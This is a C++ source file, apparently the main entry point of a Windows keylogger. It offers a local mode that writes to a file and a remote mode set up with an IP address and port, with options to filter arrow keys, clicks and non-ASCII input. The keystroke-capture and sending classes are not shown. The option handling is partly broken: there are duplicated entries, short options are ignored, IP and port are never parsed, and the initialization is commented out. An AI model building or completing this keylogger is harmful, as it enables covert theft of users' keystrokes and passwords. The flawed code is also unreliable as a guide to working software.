#include "./main.hpp"

bool g_keylogger_local = true;
bool g_keylogger_remote = false;

string* g_file_path = new string(DEFAULT_FILE_PATH);

string* g_ip = new string(DEFAULT_IP_VALUE);
int g_port = DEFAULT_PORT_VALUE;

keylogger* g_keylogger = new keylogger_local();

BOOL exit_program()
{
	delete g_keylogger;

	exit (EXIT_FAILURE);
}

void initialize_options(int argc, char** argv)
{
	int t_result_option = 0;
	int t_option_index = 0;

	struct option t_long_options[] =
	{
	{ LONG_OPTION_LOCAL, no_argument, NULL, SHORT_OPTION_LOCAL },
	{
	LONG_OPTION_FILE_PATH, required_argument, NULL, SHORT_OPTION_FILE_PATH },
	{
	LONG_OPTION_REMOTE, no_argument, NULL, SHORT_OPTION_REMOTE },
	{
	LONG_OPTION_FILE_PATH, required_argument, NULL, SHORT_OPTION_FILE_PATH },
	{
	LONG_OPTION_FILE_PATH, required_argument, NULL, SHORT_OPTION_FILE_PATH },
	{
	LONG_OPTION_NO_ARROW, no_argument, NULL, SHORT_OPTION_NO_ARROW },
	{
	LONG_OPTION_NO_CLICK, no_argument, NULL, SHORT_OPTION_NO_CLICK },
	{
	LONG_OPTION_ASCII_ONLY, no_argument, NULL, SHORT_OPTION_ASCII_ONLY },
	{
	LONG_OPTION_MAXIMUM_BUFFER_SIZE, required_argument, NULL,
	SHORT_OPTION_MAXIMUM_BUFFER_SIZE },
	{
	LONG_OPTION_HELP, no_argument, NULL, SHORT_OPTION_HELP },
	{ NULL, 0, NULL, 0 } };

	while ((t_result_option = getopt_long(argc, argv, "lf:ri:p:acAm:h", t_long_options, &t_option_index))
	    != -1)
	{
		switch (t_result_option)
		{
			case 0:
				if (strcasecmp(t_long_options[t_option_index].name, LONG_OPTION_LOCAL)
				    == 0)
				{
					if (g_keylogger != nullptr)
						delete g_keylogger;

					g_keylogger = new keylogger_local();

					g_keylogger_local = true;
					g_keylogger_remote = false;
				}
				else
					if (strcasecmp(t_long_options[t_option_index].name,
					LONG_OPTION_FILE_PATH) == 0)
					{
						cout << "file path" << endl;

						g_file_path->clear();

						g_file_path->append(optarg);
					}
					else
						if (strcasecmp(t_long_options[t_option_index].name,
						LONG_OPTION_REMOTE) == 0)
						{
							if (g_keylogger != nullptr)
								delete g_keylogger;

							g_keylogger = new keylogger_remote();

							g_keylogger_local = false;
							g_keylogger_remote = true;
						}
		}
	}
}

void print_help()
{
	cout << "main.out <mode> : local | remote" << endl;
	cout << "\tlocal : <file>" << endl;
	cout << "\tremote : <ip> <port>" << endl;

	exit(1);
}

int main(int p_number_arguments, char** p_arguments_values)
{
	if (!SetConsoleCtrlHandler((PHANDLER_ROUTINE) exit_program, TRUE))
	{
		cerr << ERROR_MESSAGE_SETCONTROLECTRLHANDLER << endl;
		return EXIT_FAILURE;
	}

	initialize_options(p_number_arguments, p_arguments_values);

	/*
	 if(g_keylogger_local == true)
	 reinterpret_cast<keylogger_local*>(g_keylogger)->initialize(*g_file_path);
	 else
	 reinterpret_cast<keylogger_remote*>(g_keylogger)->initialize(*g_ip, g_port);
	 */

	delete g_file_path;
	delete g_ip;

	g_keylogger->start();

	return EXIT_SUCCESS;
}
